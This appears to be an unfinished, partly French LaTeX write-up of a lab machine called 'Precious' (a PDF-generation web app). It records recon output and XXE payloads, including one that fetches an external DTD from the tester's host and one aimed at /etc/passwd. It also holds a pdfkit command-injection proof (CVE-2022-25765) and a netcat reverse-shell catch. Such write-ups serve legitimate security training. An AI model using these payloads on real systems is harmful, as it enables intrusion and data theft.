\chapter{Precious}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.189
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


\end{verbatim}

\subsubsection{http}
\begin{verbatim}
$ whatweb http://precious.htb
http://precious.htb [200 OK] Country[RESERVED][ZZ], 
HTML5,
HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], 
IP[10.10.11.189], 
Ruby-on-Rails, 
Title[Convert Web Page to PDF], 
UncommonHeaders[x-content-type-options], 
X-Frame-Options[SAMEORIGIN], 
X-Powered-By[Phusion Passenger(R) 6.0.15], 
X-XSS-Protection[1; mode=block], nginx[1.18.0]
\end{verbatim}
\subsubsection{pdf}

\begin{verbatim}
$ strings f0tgtd6rq6tap3crn2xlvbpredq1euyb.pdf
.. .SNIP. ..
%BeginExifToolUpdate
1 0 obj
/Creator (Generated by pdfkit v0.8.6)
endobj
11 0 obj
/Type /Metadata
/Subtype /XML
/Length 2829
stream
<?xpacket begin='
' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x='adobe:ns:meta/'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>
 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
   </rdf:Seq>
  </dc:creator>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
\end{verbatim}

\begin{verbatim}
$ exiftool f0tgtd6rq6tap3crn2xlvbpredq1euyb.pdf
ExifTool Version Number         : 12.50
File Name                       : f0tgtd6rq6tap3crn2xlvbpredq1euyb.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2022:12:02 16:31:50+01:00
File Access Date/Time           : 2022:12:02 16:32:08+01:00
File Inode Change Date/Time     : 2022:12:02 16:31:50+01:00
File Permissions                : -rw-r-----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
\end{verbatim}

xxe ?

\subsubsection{XXE}

\begin{verbatim}
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY payload "pwned">
]>
<data>&payload;</data>
\end{verbatim}

retourn bien pwned

\begin{verbatim}
This page contains the following errors:
error on line 7 at column 1: internal error: xmlParseInternalSubset: error detected in Markup declaration
Below is a rendering of the page up to the first error.
\end{verbatim}

\begin{verbatim}
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

error on line 1 at column 100: PEReference: %init; not found
\end{verbatim}



\begin{verbatim}
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

pas de fichier
\end{verbatim}


\begin{verbatim}
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://10.10.16.3:8080/evil.dtd">
    %ext;
]>
<message></message>

error on line 4 at column 10: PEReference: %ext; not found
\end{verbatim}

XML parser being used doesn't process external entities.


\subsubsection{SS-XSS}

\begin{verbatim}
<!DOCTYPE html>
<html><head>
<title>printme/</title>
</head>
<body>
<H1>HELLO</H1>
<script>document.write('PWNED')</script>
</html>

HELLO
PWNED
\end{verbatim}

mais ne semble pas vouloir faire de LFI


\subsubsection{CVE-2022-25765}
Affected versions of this package are vulnerable to Command Injection where the
URL is not properly sanitized. 

\href{https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795}{CVE-2022-25765}

En fournissant l'url suivante on constate bien le délai
\begin{verbatim}
http://10.10.16.3:8081/?name=%20`sleep 20`
\end{verbatim}


\subsection{Foothold}
\subsubsection{ruby}

from \href{https://www.revshells.com/}{revshell} python3
\begin{verbatim}
$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.11.189 46334
$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
$
\end{verbatim}

\subsubsection{x}

\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


